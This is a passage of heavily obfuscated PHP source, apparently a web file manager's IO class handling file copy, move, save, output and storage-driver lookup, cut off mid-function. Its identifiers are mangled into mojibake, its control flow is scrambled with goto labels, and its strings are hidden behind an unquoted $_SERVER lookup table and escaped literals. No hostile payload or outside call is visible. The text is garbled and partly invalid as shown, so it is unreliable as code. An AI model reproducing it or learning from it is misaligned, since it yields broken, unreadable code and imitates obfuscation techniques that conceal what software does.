public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($fİ×ÊØ«®«, $aôƒÛĞÑ¨Ş) { $Dõ°†¶Üá = self::driverMake($aôƒÛĞÑ¨Ş[0]); if (method_exists($Dõ°†¶Üá, $fİ×ÊØ«®«)) { return @call_user_func_array(array($Dõ°†¶Üá, $fİ×ÊØ«®«), $aôƒÛĞÑ¨Ş); } if (method_exists($Dõ°†¶Üá, $_SERVER[¨¤¼…´][984])) { return @call_user_func_array(array($Dõ°†¶Üá, $fİ×ÊØ«®«), $aôƒÛĞÑ¨Ş); } else { if (method_exists(self, $fİ×ÊØ«®«)) { return @call_user_func_array(array(self, $fİ×ÊØ«®«), $aôƒÛĞÑ¨Ş); } else { call_user_func_array(array(parent, $fİ×ÊØ«®«), $aôƒÛĞÑ¨Ş); } } } public static function init($c¼„½ğ›®¿) { return self::driverMake($c¼„½ğ›®¿); } public static function copy($fŸÂ™ˆºé‚, $EñÅ¿ÓíÄµ, $EâÂ«ÒÀ™ = false, $a¹Â¿ª’³Ë = false) { return self::copyMove($fŸÂ™ˆºé‚, $EñÅ¿ÓíÄµ, $EâÂ«ÒÀ™, $_SERVER[¨¤¼…´][503], $a¹Â¿ª’³Ë); } public static function move($bŠ¸œ³Œ, $b½¥ùÕì‰ø, $EÕˆÛºË¨ = false, $dğ´ÓçĞ = false) { return self::copyMove($bŠ¸œ³Œ, $b½¥ùÕì‰ø, $EÕˆÛºË¨, $_SERVER[¨¤¼…´][505], $dğ´ÓçĞ); } public static function saveFile($A®¥ÙçóÖò, $c‹¬ğø»¨Í, $e’Àí³Ô‹¦ = true) { goto Eæ…òƒÅœ; Fë«½¾ÑÙ: $C‰Ùõ²¸ç‚ = $E¤ÁºÔÏ»º->pathFather($c‹¬ğø»¨Í); $eí‘°àÌŒí = !0; if (!$e’Àí³Ô‹¦ && self::driverIsSame($b»¿ƒ¥ˆ, $E¤ÁºÔÏ»º)) { $eí‘°àÌŒí = !1; } goto c±ÜğÓôâ; c±ÜğÓôâ: $Bµˆªˆó„¿ = self::copyFile($b»¿ƒ¥ˆ, $A®¥ÙçóÖò, $E¤ÁºÔÏ»º, $C‰Ùõ²¸ç‚, $Fñ¸ê£ÀÔ[$AìØƒ§Ô¹¦[38]], $eí‘°àÌŒí); if ($bá ÉÖğ£) { $Bµˆªˆó„¿ = $bá ÉÖğ£->getPathOuter($Bµˆªˆó„¿); } return $Bµˆªˆó„¿; goto AŠµ¿øàó; Eæ…òƒÅœ: $AìØƒ§Ô¹¦ =& $_SERVER[¨¤¼…´]; $Fñ¸ê£ÀÔ = self::info($c‹¬ğø»¨Í); $b»¿ƒ¥ˆ = self::driverMake($A®¥ÙçóÖò); goto EàŸ«÷ÁÒ¾; EàŸ«÷ÁÒ¾: $E¤ÁºÔÏ»º = self::driverMake($c‹¬ğø»¨Í); $bá ÉÖğ£ = !1; if ($E¤ÁºÔÏ»º->pathParse[$AìØƒ§Ô¹¦[985]]) { $BõÈö›â¡» = $E¤ÁºÔÏ»º->pathParse[$AìØƒ§Ô¹¦[985]]; $bá ÉÖğ£ = $E¤ÁºÔÏ»º; $E¤ÁºÔÏ»º = self::driverMake($BõÈö›â¡»); } goto Fë«½¾ÑÙ; AŠµ¿øàó: } private static function copyMove($Aš„â½éŸî, $F„æÂáé×‘, $eîäÖä¬Ëœ, $eÒàâ³Êì, $E¦’ÛÕîªŠ = false) { goto b¢àÏ•¶; BÙÎÉĞš¢Œ: if ($B¾Ô½ëºä½) { $eÀŒğ¹Ã¤† = $B¾Ô½ëºä½->getPathOuter($eÀŒğ¹Ã¤†); } return $eÀŒğ¹Ã¤†; goto Fß¥ô¶‡˜; E‘éÏ½äÖ‹: $B¾Ô½ëºä½ = !1; if ($a¨ê‚Ûªà->pathParse[$b¨¾¼¦áŸ[985]]) { $F„æÂáé×‘ = $a¨ê‚Ûªà->pathParse[$b¨¾¼¦áŸ[985]]; $B¾Ô½ëºä½ = $a¨ê‚Ûªà; $a¨ê‚Ûªà = self::driverMake($F„æÂáé×‘); } self::check($fÄµ†êŠ­¥, $Aš„â½éŸî, $a¨ê‚Ûªà, $F„æÂáé×‘); goto c¢™”‡Şê; b¢àÏ•¶: $b¨¾¼¦áŸ =& $_SERVER[¨¤¼…´]; if (!$Aš„â½éŸî || $Aš„â½éŸî == $b¨¾¼¦áŸ[8] || !$F„æÂáé×‘) { return !1; } ignore_timeout(); goto cÀ¾¦êìä±; cÀ¾¦êìä±: $fÄµ†êŠ­¥ = self::driverMake($Aš„â½éŸî); $a¨ê‚Ûªà = self::driverMake($F„æÂáé×‘); $d‹¶¶ÅÈª = $eÒàâ³Êì == $b¨¾¼¦áŸ[505]; goto E‘éÏ½äÖ‹; Eíñìˆæ•†: $AÑöÈ²¥é° = $fÄµ†êŠ­¥->isFile($Aš„â½éŸî); if (!$AÑöÈ²¥é° && $a¨ê‚Ûªà->getType() == $b¨¾¼¦áŸ[684] && $fÄµ†êŠ­¥->getType() == $b¨¾¼¦áŸ[112]) { $eÀŒğ¹Ã¤† = $a¨ê‚Ûªà->copyFolderFromIO($fÄµ†êŠ­¥, $Aš„â½éŸî, $F„æÂáé×‘, $eîäÖä¬Ëœ, $d‹¶¶ÅÈª, $E¦’ÛÕîªŠ); } else { $eÀŒğ¹Ã¤† = self::copyPath($fÄµ†êŠ­¥, $Aš„â½éŸî, $a¨ê‚Ûªà, $F„æÂáé×‘, $eîäÖä¬Ëœ, $d‹¶¶ÅÈª, $AÑöÈ²¥é°, $E¦’ÛÕîªŠ); } if ($eÀŒğ¹Ã¤† && $d‹¶¶ÅÈª) { $fÄµ†êŠ­¥->remove($Aš„â½éŸî); } goto BÙÎÉĞš¢Œ; c¢™”‡Şê: Hook::trigger($b¨¾¼¦áŸ[82], $fÄµ†êŠ­¥, $Aš„â½éŸî, $a¨ê‚Ûªà, $F„æÂáé×‘); $f±©ØÇÕ¢ë = self::driverIsSame($fÄµ†êŠ­¥, $a¨ê‚Ûªà); if ($f±©ØÇÕ¢ë) { if ($eÒàâ³Êì == $b¨¾¼¦áŸ[505] && !method_exists($a¨ê‚Ûªà, $b¨¾¼¦áŸ[986]) && trim($F„æÂáé×‘, $b¨¾¼¦áŸ[8]) == trim($a¨ê‚Ûªà->pathFather($Aš„â½éŸî), $b¨¾¼¦áŸ[8])) { return $a¨ê‚Ûªà->getPathOuter($Aš„â½éŸî); } if (method_exists($a¨ê‚Ûªà, $eÒàâ³Êì)) { return $a¨ê‚Ûªà->{$eÒàâ³Êì}($Aš„â½éŸî, $F„æÂáé×‘, $eîäÖä¬Ëœ); } } goto Eíñìˆæ•†; Fß¥ô¶‡˜: } private static function check($bÍ×ˆœ½Ú…, $a˜éÃèáÛá, $eÆ×ä‚ÁÙ÷, &$A­ÌÓ„ ãì) { $fŸ¢Œç‘—Â =& $_SERVER[¨¤¼…´]; if (self::driverIsSame($bÍ×ˆœ½Ú…, $eÆ×ä‚ÁÙ÷) && $bÍ×ˆœ½Ú…->isFolder($a˜éÃèáÛá) && $bÍ×ˆœ½Ú…->isParentOf($a˜éÃèáÛá, $A­ÌÓ„ ãì)) { show_json(LNG($fŸ¢Œç‘—Â[987]), !1); } if (!$bÍ×ˆœ½Ú…->exist($a˜éÃèáÛá)) { show_json(LNG($fŸ¢Œç‘—Â[111]), !1); } } private static function copyPath($a¼±ºÇ “, $c ¶¡Ş‚‚á, $C¨¨æ¢‘Ûî, $AÅÍéî¾×¾, $CŒ‚”á£”à, $e¹ŒÃÉ…‰š, $dÁĞš©ÍÚ, $a–‘¤Å¢– = false) { goto Cˆ¶òò¯Ù; A §·™õÜÓ: if ($dÁĞš©ÍÚ) { return self::copyFile($a¼±ºÇ “, $c ¶¡Ş‚‚á, $C¨¨æ¢‘Ûî, $AÅÍéî¾×¾, $d©Ê»ôµ, $e¹ŒÃÉ…‰š); } if ($CŒ‚”á£”à == REPEAT_RENAME_FOLDER) { $CŒ‚”á£”à = !1; } $D†Ùğ•œ–À = rtrim($AÅÍéî¾×¾, $Aß¦‘¼ñö£[8]) . $Aß¦‘¼ñö£[8] . $d©Ê»ôµ; goto d¤œêï¯°¦; Aâ¾ÆßéÚğ: $bµäÎáõÖà = array_merge($DÄÑ¸ÛÂÄğ[$Aß¦‘¼ñö£[83]], $DÄÑ¸ÛÂÄğ[$Aß¦‘¼ñö£[84]]); foreach ($bµäÎáõÖà as $cÁ‚êâµø–) { $b£à¦¡óè = $cÁ‚êâµø–[$Aß¦‘¼ñö£[39]] == $Aß¦‘¼ñö£[181]; $c ¶¡Ş‚‚á = $a¼±ºÇ “->getPathInner($cÁ‚êâµø–[$Aß¦‘¼ñö£[85]]); $fí»Ò‚£ñ = self::copyPath($a¼±ºÇ “, $c ¶¡Ş‚‚á, $C¨¨æ¢‘Ûî, $AÅÍéî¾×¾, $CŒ‚”á£”à, $e¹ŒÃÉ…‰š, $b£à¦¡óè); if (!$fí»Ò‚£ñ) { write_log($Aß¦‘¼ñö£[988] . $c ¶¡Ş‚‚á . $Aß¦‘¼ñö£[989] . $AÅÍéî¾×¾, $Aß¦‘¼ñö£[990]); } } return $CÜˆËšâ¦™; goto F’«ÚÂÍ§; Cˆ¶òò¯Ù: $Aß¦‘¼ñö£ =& $_SERVER[¨¤¼…´]; $d©Ê»ôµ = $a–‘¤Å¢– ? $a–‘¤Å¢– : $a¼±ºÇ “->getPathName($a¼±ºÇ “->pathThis($c ¶¡Ş‚‚á)); if ($CŒ‚”á£”à) { $E¯”´™‹± = $C¨¨æ¢‘Ûî->fileNameExist($AÅÍéî¾×¾, $d©Ê»ôµ); $d©Ê»ôµ = $C¨¨æ¢‘Ûî->fileNameAuto($AÅÍéî¾×¾, $d©Ê»ôµ, $CŒ‚”á£”à, !$dÁĞš©ÍÚ); $CŒ‚”á£”à = $E¯”´™‹± ? $CŒ‚”á£”à : !1; } goto A §·™õÜÓ; d¤œêï¯°¦: $CÜˆËšâ¦™ = $C¨¨æ¢‘Ûî->mkdir($C¨¨æ¢‘Ûî->getPath($D†Ùğ•œ–À)); $AÅÍéî¾×¾ = $C¨¨æ¢‘Ûî->getPathInner($CÜˆËšâ¦™); $DÄÑ¸ÛÂÄğ = $a¼±ºÇ “->listPath($c ¶¡Ş‚‚á, !0); goto Aâ¾ÆßéÚğ; F’«ÚÂÍ§: } private static function copyFile($eÎ¡ñƒÑ, $aÀá º¥ŞÂ, $b‘ÆØÏâ¸, $C¹òÕ–¬, $CÎ‰¬­¸ß‚, $cñ®ŠßÄ¾£) { goto aè¡‰¿ªå´; EáÖä¥ò‚: $a›•›—òìâ = $eÎ¡ñƒÑ->iconvApp($a›•›—òìâ); $eÈî¾£ä”Ã = $b‘ÆØÏâ¸->upload($C¹òÕ–¬, $a›•›—òìâ, $cñ®ŠßÄ¾£); self::remove($Eğ­±¯§î . $EÍØÒ‰‰‡); goto CŒ£çà¸ãÈ; DØä›Ò«ƒÜ: mk_dir($Eğ­±¯§î); $a›•›—òìâ = $Eğ­±¯§î . $EÍØÒ‰‰‡; $a›•›—òìâ = $eÎ¡ñƒÑ->download($aÀá º¥ŞÂ, $a›•›—òìâ); goto EáÖä¥ò‚; aè¡‰¿ªå´: $D¿‡¸¡Ú =& $_SERVER[¨¤¼…´]; $C¹òÕ–¬ = $b‘ÆØÏâ¸->getPath(rtrim($C¹òÕ–¬, $D¿‡¸¡Ú[8]) . $D¿‡¸¡Ú[8] . $CÎ‰¬­¸ß‚); $EÍØÒ‰‰‡ = $D¿‡¸¡Ú[991] . time() . rand_string(5); goto dÉ·ğÒ¼ŒŸ; dÉ·ğÒ¼ŒŸ: Hook::trigger($D¿‡¸¡Ú[992], $eÎ¡ñƒÑ, $aÀá º¥ŞÂ, $b‘ÆØÏâ¸, $C¹òÕ–¬, $CÎ‰¬­¸ß‚, $EÍØÒ‰‰‡); if (self::driverIsSame($eÎ¡ñƒÑ, $b‘ÆØÏâ¸)) { if ($cñ®ŠßÄ¾£) { $eÈî¾£ä”Ã = $b‘ÆØÏâ¸->moveFile($aÀá º¥ŞÂ, $C¹òÕ–¬); } else { $eÈî¾£ä”Ã = $b‘ÆØÏâ¸->copyFile($aÀá º¥ŞÂ, $C¹òÕ–¬); } Hook::trigger($D¿‡¸¡Ú[993], $eÎ¡ñƒÑ, $aÀá º¥ŞÂ, $b‘ÆØÏâ¸, $C¹òÕ–¬, $CÎ‰¬­¸ß‚, $eÈî¾£ä”Ã); return $eÈî¾£ä”Ã; } $Eğ­±¯§î = TEMP_FILES; goto DØä›Ò«ƒÜ; CŒ£çà¸ãÈ: Hook::trigger($D¿‡¸¡Ú[993], $eÎ¡ñƒÑ, $aÀá º¥ŞÂ, $b‘ÆØÏâ¸, $C¹òÕ–¬, $CÎ‰¬­¸ß‚, $eÈî¾£ä”Ã); return $eÈî¾£ä”Ã; goto aæåÍæ÷¾ë; aæåÍæ÷¾ë: } public static function pathFather($EÚ°îš¼õÆ) { $Dºš•ÈÕö° = IO::init($EÚ°îš¼õÆ); $DË¸¦ïÏÊ = $Dºš•ÈÕö°->pathFather($Dºš•ÈÕö°->path); return $Dºš•ÈÕö°->getPathOuter($DË¸¦ïÏÊ); } public static function fileOut($BÉ·Ó†øÖ, $c™÷§¤ÅÃ® = false, $b…È¿à’­ó = false, $Dê»„ÉÀœ = '') { $f‹»Œ†¥Í = self::driverMake($BÉ·Ó†øÖ); if ($f‹»Œ†¥Í->isFileOutServer()) { return $f‹»Œ†¥Í->fileOutServer($BÉ·Ó†øÖ, $c™÷§¤ÅÃ®, $b…È¿à’­ó, $Dê»„ÉÀœ); } return $f‹»Œ†¥Í->fileOut($BÉ·Ó†øÖ, $c™÷§¤ÅÃ®, $b…È¿à’­ó, $Dê»„ÉÀœ); } public static function fileOutImage($D¹Úíì, $aÌ‡¹Ì°Ã– = 250) { $EÇó¢Îâ¢’ = array(250, 600, 1200, 3000, 5000); for ($CêÖìÅø­ = 0; $CêÖìÅø­ < count($EÇó¢Îâ¢’); $CêÖìÅø­++) { if ($CêÖìÅø­ == 0 && $aÌ‡¹Ì°Ã– <= $EÇó¢Îâ¢’[$CêÖìÅø­]) { $aÌ‡¹Ì°Ã– = $EÇó¢Îâ¢’[$CêÖìÅø­]; break; } else { if ($aÌ‡¹Ì°Ã– > $EÇó¢Îâ¢’[$CêÖìÅø­ - 1] && $aÌ‡¹Ì°Ã– <= $EÇó¢Îâ¢’[$CêÖìÅø­]) { $aÌ‡¹Ì°Ã– = $EÇó¢Îâ¢’[$CêÖìÅø­]; break; } else { if ($CêÖìÅø­ == count($EÇó¢Îâ¢’) - 1 && $aÌ‡¹Ì°Ã– > $EÇó¢Îâ¢’[$CêÖìÅø­]) { $aÌ‡¹Ì°Ã– = $EÇó¢Îâ¢’[$CêÖìÅø­]; break; } } } } $CÚ´†˜í³¯ = self::driverMake($D¹Úíì); if ($CÚ´†˜í³¯->isFileOutServer()) { return $CÚ´†˜í³¯->fileOutImageServer($D¹Úíì, $aÌ‡¹Ì°Ã–); } return $CÚ´†˜í³¯->fileOutImage($D¹Úíì, $aÌ‡¹Ì°Ã–); } private static function driverIsSame($AÜ…ÊˆÖ‡, $e°×ÎŞÑš) { goto AÎÀ°ï‰ÍÒ; AÎÀ°ï‰ÍÒ: $D•šºñç›Ó =& $_SERVER[¨¤¼…´]; $dÀÂ‰Šæ‡² = $AÜ…ÊˆÖ‡->getType(); $aêöÉ¾™î£ = $e°×ÎŞÑš->getType(); goto aÉó½‡ë²¥; aÉó½‡ë²¥: if ($dÀÂ‰Šæ‡² != $aêöÉ¾™î£) { return !1; } if ($dÀÂ‰Šæ‡² == $D•šºñç›Ó[684]) { return !0; } if ($dÀÂ‰Šæ‡² == $D•šºñç›Ó[112]) { return !0; } goto CŠ¼§êëµ; CŠ¼§êëµ: if ($AÜ…ÊˆÖ‡->pathDriver == $e°×ÎŞÑš->pathDriver) { return !0; } return !1; goto C­ÁÈî˜ìÑ; C­ÁÈî˜ìÑ: } public static function copyUpdate($D«†¸¯‚çÜ, $c‘ßñçà—¡) { goto Aî¥øŠ·ßÆ; Aî¥øŠ·ßÆ: $aâôÓÔÁÔ =& $_SERVER[¨¤¼…´]; if (!IO::exist($D«†¸¯‚çÜ)) { return !1; } if (!IO::exist($c‘ßñçà—¡)) { IO::mkdir($c‘ßñçà—¡); } goto F¤Ò†™Í; F¤Ò†™Í: $FÖ¨†¡Ğîá = self::_listAll($D«†¸¯‚çÜ); $dØ´ñÓ‰°Ğ = self::_listAll($c‘ßñçà—¡); $aâºçÑôÍ× = array(); goto eù¶ĞÃŞï´; eï’Æö‰Ò: Hook::trigger($aâôÓÔÁÔ[997], $D«†¸¯‚çÜ, $c‘ßñçà—¡, $f±†öîæ¶); foreach ($fá‘É„¿Ñ§ as $F‹š²ÇõçŞ) { IO::mkdir($F‹š²ÇõçŞ); } foreach ($aâºçÑôÍ× as $F‹š²ÇõçŞ) { IO::copy($F‹š²ÇõçŞ[$aâôÓÔÁÔ[994]], $F‹š²ÇõçŞ[$aâôÓÔÁÔ[995]], REPEAT_REPLACE); } goto bÜÍ‚’¸ã ; eù¶ĞÃŞï´: $fá‘É„¿Ñ§ = array(); foreach ($FÖ¨†¡Ğîá as $FÉ›§ŒŞš« => $F‹š²ÇõçŞ) { if (isset($dØ´ñÓ‰°Ğ[$FÉ›§ŒŞš«])) { if ($F‹š²ÇõçŞ[$aâôÓÔÁÔ[86]] == 1) { continue; } if ($dØ´ñÓ‰°Ğ[$FÉ›§ŒŞš«][$aâôÓÔÁÔ[87]] == $F‹š²ÇõçŞ[$aâôÓÔÁÔ[87]]) { continue; } } if ($F‹š²ÇõçŞ[$aâôÓÔÁÔ[86]] == 1) { $fá‘É„¿Ñ§[] = $c‘ßñçà—¡ . $aâôÓÔÁÔ[8] . $FÉ›§ŒŞš«; continue; } $E…œğ½çŠ = strstr(trim($FÉ›§ŒŞš«, $aâôÓÔÁÔ[8]), $aâôÓÔÁÔ[8]) ? get_path_father($FÉ›§ŒŞš«) : $aâôÓÔÁÔ[43]; $aâºçÑôÍ×[] = array($aâôÓÔÁÔ[994] => $F‹š²ÇõçŞ[$aâôÓÔÁÔ[85]], $aâôÓÔÁÔ[995] => rtrim($c‘ßñçà—¡, $aâôÓÔÁÔ[8]) . $aâôÓÔÁÔ[8] . $E…œğ½çŠ, $aâôÓÔÁÔ[996] => $F‹š²ÇõçŞ); } $f±†öîæ¶ = array($aâôÓÔÁÔ[181] => $aâºçÑôÍ×, $aâôÓÔÁÔ[86] => $fá‘É„¿Ñ§); goto eï’Æö‰Ò; bÜÍ‚’¸ã : } private static function _listAll($d‘âÚ•ç ê) { $f¾¨´„ßô =& $_SERVER[¨¤¼…´]; $d‘âÚ•ç ê = KodIO::clear($d‘âÚ•ç ê); $d©ÙÃÂ´Çõ = IO::listAll($d‘âÚ•ç ê); foreach ($d©ÙÃÂ´Çõ as &$A¼Æ¼ÆÛª­) { $dÚöˆ¯È”Å = substr($A¼Æ¼ÆÛª­[$f¾¨´„ßô[85]], strlen($d‘âÚ•ç ê)); $A¼Æ¼ÆÛª­[$f¾¨´„ßô[998]] = trim($dÚöˆ¯È”Å, $f¾¨´„ßô[8]); } unset($A¼Æ¼ÆÛª­); return array_to_keyvalue($d©ÙÃÂ´Çõ, $f¾¨´„ßô[998]); } public static function fileSubstr($BÁ«˜¸œ“‹, $BŸìÜù—, $aº± ƒíİ‘ = false) { goto eˆĞãëÈÕ¤; FÀœÈÉß: if ($aº± ƒíİ‘ === !1) { $aº± ƒíİ‘ = $F¦æŠ›îÔÖ - $BŸìÜù—; } if ($BŸìÜù— + $aº± ƒíİ‘ > $F¦æŠ›îÔÖ) { $aº± ƒíİ‘ = $F¦æŠ›îÔÖ - $BŸìÜù—; } if (!$F¦æŠ›îÔÖ && $b­„ÕëƒÅ->getType() == $E¿¶”Çšİ°[112] && !$b­„ÕëƒÅ->exist($BÁ«˜¸œ“‹)) { throw new Exception($E¿¶”Çšİ°[999] . LNG($E¿¶”Çšİ°[1000])); } goto d¦²ª¶¢â; Bø¼¼åÇó: $aø”×ÔâÜÖ = $BŸìÜù—; $B½³ ÓÙšñ = $aº± ƒíİ‘; if ($BŸìÜù— < 0) { $BŸìÜù— = $F¦æŠ›îÔÖ + $BŸìÜù—; } goto FÀœÈÉß; eˆĞãëÈÕ¤: $E¿¶”Çšİ° =& $_SERVER[¨¤¼…´]; $b­„ÕëƒÅ = self::driverMake($BÁ«˜¸œ“‹); $F¦æŠ›îÔÖ = $b­„ÕëƒÅ->size($BÁ«˜¸œ“‹); goto Bø¼¼åÇó; BÎÖ‰¤Û¾–: if (!$FÇÔŠî×Ï && $aº± ƒíİ‘ && isset($GLOBALS[$E¿¶”Çšİ°[1001]])) { throw new Exception($GLOBALS[$E¿¶”Çšİ°[1001]][$E¿¶”Çšİ°[1002]]); } return $FÇÔŠî×Ï; goto bßÑù‰ë©È; d¦²ª¶¢â: if ($aº± ƒíİ‘ <= 0) { return $E¿¶”Çšİ°[43]; } if ($BŸìÜù— < 0 || $BŸìÜù— >= $F¦æŠ›îÔÖ || $aº± ƒíİ‘ > 1024 * 1024 * 5) { throw new Exception("\146\151\154\145\x52\x65\x61\x64\40\145\162\162\x6f\162\41\40\x73\x74\x61\162\x74\x3d{$BŸìÜù—}\x3b\x6c\x65\156\147\x74\150\x3d{$aº± ƒíİ‘}\73\x20\x73\x69\172\145\75{$F¦æŠ›îÔÖ}\73"); } $FÇÔŠî×Ï = $b­„ÕëƒÅ->fileSubstr($BÁ«˜¸œ“‹, $BŸìÜù—, $aº± ƒíİ‘); goto BÎÖ‰¤Û¾–; bßÑù‰ë©È: } private static function driverMake(&$DÁŒïô•‹) { goto Fİí×õ¹…«; e±†µÔ›Ñ’: return $Dôèâ…Ş˜·; goto f«¥ºŠ›øì; Fİí×õ¹…«: $e¢•”Êªç‡ =& $_SERVER[¨¤¼…´]; $eªÏŒßŠÔç = KodIO::parse($DÁŒïô•‹); if (!self::$driverListSystem) { $fí‚…ˆ¾ã = Model($e¢•”Êªç‡[693])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($fí‚…ˆ¾ã, $e¢•”Êªç‡[379]); } goto f³„ÜšíÜ; f³„ÜšíÜ: if ($eªÏŒßŠÔç[$e¢•”Êªç‡[39]] == KodIO::KOD_IO && !self::$driverListSystem[$eªÏŒßŠÔç[$e¢•”Êªç‡[379]]]) { return !1; } $DÁŒïô•‹ = $eªÏŒßŠÔç[$e¢•”Êªç‡[1003]]; $Dôèâ…Ş˜· = self::driverGet($eªÏŒßŠÔç, $DÁŒïô•‹); goto e±†µÔ›Ñ’; f«¥ºŠ›øì: } private static function driverGet($Câ¹ëªÁ·ì, &$d×”«áé¿”) { goto bâèğå‹Ú; bâèğå‹Ú: $F…ÕÌŠŠ·Õ =& $_SERVER[¨¤¼…´]; $Eõƒ„¹ùº = $Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[1004]]; $f¤Á˜‰‹ = $Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[379]]; goto fáÄˆÂ¾ğ”; fáÄˆÂ¾ğ”: switch ($Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[39]]) { case KodIO::KOD_IO: $d¡îùé“­ = self::$driverListSystem[$f¤Á˜‰‹]; break; case KodIO::KOD_SOURCE: $d×”«áé¿” = $f¤Á˜‰‹ . $d×”«áé¿”; $d¡îùé“­ = array($F…ÕÌŠŠ·Õ[1005] => $F…ÕÌŠŠ·Õ[1006], $F…ÕÌŠŠ·Õ[6] => $Câ¹ëªÁ·ì); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $EãìÂ‚Ø¢­ = $GLOBALS[$F…ÕÌŠŠ·Õ[1007]]; self::$driverListUser = array_to_keyvalue($EãìÂ‚Ø¢­, $F…ÕÌŠŠ·Õ[379]); } $d¡îùé“­ = self::$driverListUser[$f¤Á˜‰‹]; break; case KodIO::KOD_SHARE_LINK: $d¡îùé“­ = array($F…ÕÌŠŠ·Õ[1005] => $F…ÕÌŠŠ·Õ[1008], $F…ÕÌŠŠ·Õ[6] => $Câ¹ëªÁ·ì); $e‰“è—Ù±ƒ = Action($F…ÕÌŠŠ·Õ[1009])->sharePathInfo($Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[85]]); $d×”«áé¿” = $e‰“è—Ù±ƒ[$F…ÕÌŠŠ·Õ[381]]; if (!$e‰“è—Ù±ƒ[$F…ÕÌŠŠ·Õ[381]]) { $e™—ÄçŞí¥ = Model($F…ÕÌŠŠ·Õ[548])->getInfo($e‰“è—Ù±ƒ[$F…ÕÌŠŠ·Õ[452]]); $d×”«áé¿” = KodIO::clear($e™—ÄçŞí¥[$F…ÕÌŠŠ·Õ[1010]] . $Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[1003]]); $Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[450]] = $e™—ÄçŞí¥; $Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[985]] = $d×”«áé¿”; $d¡îùé“­ = array($F…ÕÌŠŠ·Õ[1005] => $F…ÕÌŠŠ·Õ[1011], $F…ÕÌŠŠ·Õ[6] => $Câ¹ëªÁ·ì); } break; case KodIO::KOD_SHARE_ITEM: $d¡îùé“­ = array($F…ÕÌŠŠ·Õ[1005] => $F…ÕÌŠŠ·Õ[1012], $F…ÕÌŠŠ·Õ[6] => $Câ¹ëªÁ·ì); $e™—ÄçŞí¥ = Model($F…ÕÌŠŠ·Õ[548])->getInfo($Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[379]]); if ($e™—ÄçŞí¥[$F…ÕÌŠŠ·Õ[381]] == $F…ÕÌŠŠ·Õ[481]) { $d×”«áé¿” = KodIO::clear($e™—ÄçŞí¥[$F…ÕÌŠŠ·Õ[1010]] . $Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[1003]]); $Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[450]] = $e™—ÄçŞí¥; $Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[985]] = $d×”«áé¿”; $d¡îùé“­ = array($F…ÕÌŠŠ·Õ[1005] => $F…ÕÌŠŠ·Õ[1013], $F…ÕÌŠŠ·Õ[6] => $Câ¹ëªÁ·ì); } else { if (!$d×”«áé¿”) { $d×”«áé¿” = $e™—ÄçŞí¥[$F…ÕÌŠŠ·Õ[381]]; } } break; default: $d×”«áé¿” = $Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[85]]; $d¡îùé“­ = array($F…ÕÌŠŠ·Õ[1005] => $F…ÕÌŠŠ·Õ[1014]); break; } $dÃ‡Ô©ó¸ï = $Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[85]]; if (!isset(self::$driverCache[$dÃ‡Ô©ó¸ï])) { $AÎ†øÓƒâñ = strtolower($d¡îùé“­[$F…ÕÌŠŠ·Õ[100]]); $Eø‹ÏÍÏÔß = $GLOBALS[$F…ÕÌŠŠ·Õ[6]][$F…ÕÌŠŠ·Õ[94]][$F…ÕÌŠŠ·Õ[743]]; $f˜Œ‹Â¹†‰ = $F…ÕÌŠŠ·Õ[81] . (isset($Eø‹ÏÍÏÔß[$AÎ†øÓƒâñ]) ? $Eø‹ÏÍÏÔß[$AÎ†øÓƒâñ] : ucfirst($AÎ†øÓƒâñ)); if (!class_exists($f˜Œ‹Â¹†‰)) { show_json("{$f˜Œ‹Â¹†‰}\40\x6e\157\x74\40\145\x78\151\x73\164\163\41", !1); } $b‰ŸëäãÃ– = isset($d¡îùé“­[$F…ÕÌŠŠ·Õ[6]]) ? $d¡îùé“­[$F…ÕÌŠŠ·Õ[6]] : !1; self::$driverCache[$dÃ‡Ô©ó¸ï] = new $f˜Œ‹Â¹†‰($b‰ŸëäãÃ–); } goto cäÁµò¶õ; FíÓßˆƒ³à: $A‘É‡ãÃÌä->path = $d×”«áé¿”; return $A‘É‡ãÃÌä; goto fˆ­Üíò°; Eä…Šã„¯: if (isset($d¡îùé“­[$F…ÕÌŠŠ·Õ[6]][$F…ÕÌŠŠ·Õ[1015]])) { $A‘É‡ãÃÌä->pathBase = rtrim($d¡îùé“­[$F…ÕÌŠŠ·Õ[6]][$F…ÕÌŠŠ·Õ[1015]], $F…ÕÌŠŠ·Õ[8]) . $F…ÕÌŠŠ·Õ[8]; $d×”«áé¿” = $A‘É‡ãÃÌä->pathBase . ltrim($d×”«áé¿”, $F…ÕÌŠŠ·Õ[8]); } $d×”«áé¿” = $A‘É‡ãÃÌä->getPath($d×”«áé¿”); if (isset($Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[985]])) { $d×”«áé¿” = $Câ¹ëªÁ·ì[$F…ÕÌŠŠ·Õ[985]]; } goto FíÓßˆƒ³à; cäÁµò¶õ: $A‘É‡ãÃÌä = self::$driverCache[$dÃ‡Ô©ó¸ï]; $A‘É‡ãÃÌä->pathDriver = $Eõƒ„¹ùº; $A‘É‡ãÃÌä->pathBase = $F…ÕÌŠŠ·Õ[43]; goto Eä…Šã„¯; fˆ­Üíò°: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $fåš…Äß¢õ; if (!$fåš…Äß¢õ) { $B†Ë½‚ìğ¾ = IO::init($_SERVER[¨¤¼…´][8]); } return $B†Ë½‚ìğ¾; } private static function iconvSystem($A¸¹ªæ×¯®) { return self::local()->iconvSystem($A¸¹ªæ×¯®); } private static function iconvApp($d¡§ÃæÒƒŠ) { return self::local()->iconvApp($d¡§ÃæÒƒŠ); } public static function zip($BÒ·óÒ©ÍŠ, $BÁ™ƒ†óÇê = "\x7a\x69\x70", $e±ÏË’ÍÙ© = '', $dª®ñè•Ø† = 